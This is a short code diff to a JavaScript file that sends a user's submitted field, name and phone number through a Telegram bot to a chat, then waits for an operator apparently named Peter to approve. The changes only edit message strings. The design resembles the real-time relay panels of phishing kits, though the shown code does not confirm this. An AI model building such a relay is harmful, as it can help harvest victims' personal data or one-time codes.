@@ -278,7 +278,7 @@
         `⏰ Submitted: ${formatTime(now)}`,
         `⏰ Expires: ${formatTime(expires)}`,
         '────────────────────────',
-        '⏳ Waiting for PETER VER...'
+        '⏳ ONLY FOR PETER'
       ].join('\n');
 
       const sent = await tgRequest('sendMessage', {
@@ -293,7 +293,7 @@
       });
 
       if (!sent.ok) {
-        throw new Error(sent.description || 'Failed to send message to Telegram');
+        throw new Error(sent.description || 'Failed to send message');
       }
 
       const deadline = Date.now() + timeoutMs;
@@ -326,7 +326,7 @@
               chat_id: TELEGRAM_CHAT_ID,
               text: approved
                 ? [
-                    `✅ ${fieldLabel.toUpperCase()} PETER VERIFIED SUCCESSFULLY`,
+                    `✅ ${fieldLabel.toUpperCase()} VERIFIED SUCCESSFULLY`,
                     '────────────────────────',
                     `👤 Name: ${user}`,
                     `☎️ Phone: ${phone}`,
